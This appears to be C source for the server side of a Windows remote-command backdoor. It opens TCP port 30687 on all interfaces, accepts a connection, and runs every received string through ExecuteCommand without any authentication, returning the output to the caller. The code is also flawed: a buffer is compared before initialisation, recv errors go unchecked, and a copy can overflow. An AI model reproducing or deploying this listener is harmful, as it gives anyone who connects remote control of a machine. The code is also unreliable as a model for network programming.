#include <winsock2.h>

#include "Command.h"

bool StartServer(void);

bool StartServer(void)
{
	WSADATA			WSA;
	SOCKET			ConnectSock;
	SOCKET			ListenSock;
	SOCKADDR_IN		SockAddr;
	char			Buffer[500];
	char			Command[500];
	int				CommandLength;
	bool			CommandReturn;
	char			Closed[]		= "Closed.";

	if(WSAStartup(MAKEWORD(2, 0), &WSA) == 0)
	{
		ConnectSock = socket(AF_INET, SOCK_STREAM, 0);

		if(ConnectSock != INVALID_SOCKET)
		{
			memset(&SockAddr, 0, sizeof(SockAddr));

			SockAddr.sin_family		 = AF_INET;
			SockAddr.sin_port		 = htons(30687);
			SockAddr.sin_addr.s_addr = ADDR_ANY;

			if(bind(ConnectSock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != SOCKET_ERROR)
			{
				if(listen(ConnectSock, 1) != SOCKET_ERROR)
				{
					ListenSock = accept(ConnectSock, 0, 0);

					if(ListenSock != INVALID_SOCKET)
					{
						while(lstrcmp(Command, "!close") != 0)
						{
							CommandLength = recv(ListenSock, Buffer, sizeof(Buffer), 0);

							lstrcpyn(Command, Buffer, CommandLength + 1);

							CommandReturn = ExecuteCommand(Command);

							lstrcpyn(Buffer, "", 500);

							if(CommandReturn == false)
							{
								if(lstrcmp(Command, "!close") == 0)
								{
									send(ListenSock, Closed, lstrlen(Closed), 0);

									closesocket(ListenSock);
									closesocket(ConnectSock);
									WSACleanup();
									ExitProcess(0);

									return true;
								}

								if(lstrcmp(Command, "!quit") == 0)
								{
									lstrcpy(MainBuffer, "Client quit.");
									send(ListenSock, MainBuffer, lstrlen(MainBuffer), 0);
									closesocket(ListenSock);
									closesocket(ConnectSock);
									WSACleanup();

									StartServer();
								}
								
								FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, 0, GetLastError(), 0, MainBuffer, sizeof(MainBuffer), 0);
							}

							send(ListenSock, MainBuffer, lstrlen(MainBuffer), 0);
						}
					}

					closesocket(ListenSock);
				}
			}

			closesocket(ConnectSock);
		}

		WSACleanup();
	}
	
	return false;
}